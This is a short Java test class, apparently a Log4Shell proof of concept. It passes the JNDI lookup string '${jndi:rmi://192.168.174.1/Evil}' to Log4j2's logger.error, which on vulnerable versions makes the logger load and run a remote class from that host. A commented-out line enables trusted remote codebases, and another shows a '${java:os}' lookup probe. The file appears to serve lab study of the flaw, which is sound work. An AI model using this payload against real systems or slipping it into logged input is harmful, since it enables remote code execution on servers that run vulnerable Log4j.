package com.fdx;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;
import java.io.IOException;
import java.lang.System;

public class Log4j2Test {

    private static  final Logger logger = LogManager.getLogger();
        public static void main(String... args) throws IOException, NamingException {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        String username = "${jndi:rmi://192.168.174.1/Evil}";
//        String username="${java:os}";
        logger.error("hello {}",username);

        }
}
